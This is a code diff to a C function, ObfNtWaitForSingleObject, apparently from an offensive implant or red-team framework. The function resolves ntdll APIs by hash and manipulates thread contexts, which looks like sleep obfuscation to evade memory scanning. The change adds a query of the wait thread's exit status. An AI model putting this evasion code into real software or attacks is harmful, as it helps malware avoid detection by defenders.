@@ -14,6 +14,7 @@ typedef struct
 {
 	D_API( NtSignalAndWaitForSingleObject );
 	D_API( RtlGetCompressionWorkSpaceSize );
+	D_API( NtQueryInformationThread );
 	D_API( NtWaitForSingleObject );
 	D_API( NtSetContextThread );
 	D_API( NtGetContextThread );
@@ -513,33 +514,36 @@ static D_SEC( B ) DECLSPEC_NOINLINE NTSTATUS ThreadSetCallInternal( _Out_ PHANDL
 !*/
 D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_ PLARGE_INTEGER Timeout )
 {
-	API			Api;
+	API				Api;
+	THREAD_BASIC_INFORMATION	Tbi;
 
-	PVOID			Sfp = NULL;
-	PVOID			Cmp = NULL;
-	PVOID			Wrk = NULL;
-	PVOID			Tmp = NULL;
+	PVOID				Sfp = NULL;
+	PVOID				Cmp = NULL;
+	PVOID				Wrk = NULL;
+	PVOID				Tmp = NULL;
 
-	HANDLE			Evt = NULL;
-	HANDLE			Th1 = NULL;
-	HANDLE			Th2 = NULL;
-	HANDLE			Th3 = NULL;
-	HANDLE			Th4 = NULL;
-	HANDLE			Th5 = NULL;
-	LPVOID			Mem = NULL;
+	HANDLE				Evt = NULL;
+	HANDLE				Th1 = NULL;
+	HANDLE				Th2 = NULL;
+	HANDLE				Th3 = NULL;
+	HANDLE				Th4 = NULL;
+	HANDLE				Th5 = NULL;
+	LPVOID				Mem = NULL;
 
-	DWORD			Cln = 0;
-	DWORD			Wsp = 0;
-	DWORD			Prt = 0;
-	SIZE_T			Len = 0;
-	SIZE_T			Sfl = 0;
-	NTSTATUS		Nst = STATUS_SUCCESS;
+	DWORD				Cln = 0;
+	DWORD				Wsp = 0;
+	DWORD				Prt = 0;
+	SIZE_T				Len = 0;
+	SIZE_T				Sfl = 0;
+	NTSTATUS			Nst = STATUS_SUCCESS;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );
 
 	Api.NtSignalAndWaitForSingleObject = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtSignalAndWaitForSingleObject" ) );
 	Api.RtlGetCompressionWorkSpaceSize = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "RtlGetCompressionWorkSpaceSize" ) );
+	Api.NtQueryInformationThread       = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtQueryInformationThread" ) );
 	Api.RtlCompressBuffer              = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "RtlCompressBuffer" ) );
 	Api.NtTerminateThread              = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtTerminateThread" ) );
 	Api.NtCreateEvent                  = PeGetFuncEat( PebGetModule( OBF_HASH_MAKE( "ntdll.dll" ) ), OBF_HASH_MAKE( "NtCreateEvent" ) );
@@ -742,6 +746,17 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 		if ( ! NT_SUCCESS( Nst ) ) {
 			break;
 		};
+
+		/* Query the exit status of the NtWaitForSingleObject call */
+		Nst = Api.NtQueryInformationThread( Th2, ThreadBasicInformation, &Tbi, sizeof( Tbi ), NULL );
+
+		/* Failed to query its basic information */
+		if ( ! NT_SUCCESS( Nst ) ) {
+			break;
+		};
+
+		/* Set the current status based on the threads return */
+		Nst = Tbi.ExitStatus;
 	} while ( 0 );
 
 	if ( Th5 != NULL ) {
@@ -779,6 +794,7 @@ D_SEC( B ) NTSTATUS NTAPI ObfNtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOO
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
+	RtlSecureZeroMemory( &Tbi, sizeof( Tbi ) );
 
 	/* Return the status */
 	return Nst;
